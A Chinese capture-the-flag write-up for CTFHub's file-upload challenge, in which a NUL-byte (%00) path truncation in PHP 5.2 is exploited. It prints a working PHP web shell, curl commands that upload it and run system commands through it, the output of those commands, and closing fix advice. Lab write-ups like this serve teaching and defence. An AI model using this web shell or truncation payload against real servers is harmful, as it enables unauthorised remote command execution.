CTFHub - Web - 文件上传 - 00截断

# CTFHub # Web # 文件上传 # 00截断 # RCE

一、题目信息

  • 题目名称：文件上传 - 00截断
  • 题目方向：Web - 文件上传
  • 运行环境：PHP 5.2.17
  • 题目目标：利用 PHP 5.2 的 NUL 字节路径截断绕过受控文件名拼接，写入 PHP Web Shell 并读取 Flag。

二、漏洞分析

上传逻辑先通过 pathinfo() 提取文件扩展名，只允许 jpg、png、gif。通过校验后，服务端把可控的 road 参数、随机数、时间和扩展名拼接为最终路径：

$name = basename($_FILES['file']['name']);
$ext = pathinfo($name)['extension'];
$des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], $des);

PHP 5.2 的文件系统函数在遇到 NUL 字节（\x00）时会截断后续路径。将 road 设置为 /var/www/html/upload/shell.php%00 后，实际写入路径变为 /var/www/html/upload/shell.php；随机文件名和 .jpg 后缀均被丢弃。

客户端文件名保持为合法的 shell.jpg，因此可以通过扩展名白名单；文件内容不做校验，可以直接写入 PHP 代码。

三、解题步骤

  1. 构造 Payload：创建内容为 PHP 代码的 shell.jpg，通过 cmd 参数执行系统命令。 
    <?php @system($_GET["cmd"]); ?>
  2. 利用 NUL 截断上传：在 road 参数中加入 URL 编码的 %00，并保持上传文件名为合法的 shell.jpg。 
    curl -i -X POST \
  -F "submit=Submit" \
  -F "file=@shell.jpg;filename=shell.jpg;type=image/jpeg" \
  "http://<challenge-host>:10800/?road=/var/www/html/upload/shell.php%00"
    服务端返回 上传成功，实际文件被写入 /var/www/html/upload/shell.php。
  3. 验证命令执行：访问截断后生成的 Web Shell，确认命令以 www-data 身份执行。 
    curl --get \
  --data-urlencode "cmd=id" \
  "http://<challenge-host>:10800/upload/shell.php"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
  4. 定位 Flag 文件：搜索 Web 根目录中包含 flag 的文件。 
    find / -iname "*flag*" -type f 2>/dev/null
    /var/www/html/flag_2394721086.php
  5. 读取 Flag：Flag 位于 PHP 文件的注释中，直接通过 Web Shell 读取源码。 
    cat /var/www/html/flag_2394721086.php
    <?php // ctfhub{5e048cc870e76996674fc0cc}

四、最终 Flag

ctfhub{5e048cc870e76996674fc0cc}

五、修复建议

  • 拒绝控制字符：文件名和路径参数中拒绝 NUL、换行等控制字符，不能把用户输入直接交给文件系统函数。
  • 升级 PHP：使用仍受支持的 PHP 版本；现代 PHP 会拒绝包含 NUL 字节的路径，但仍不能依赖版本差异作为唯一防线。
  • 固定上传路径：上传目录应由服务端固定配置，禁止通过请求参数控制上传目录或目标文件名。
  • 服务端重命名：只信任文件内容检测结果，由服务端生成随机文件名和安全扩展名，不保留用户可控名称。
  • 隔离执行权限：将上传目录移出 Web 根目录或关闭脚本执行权限，并限制 Web 服务账户的系统权限。
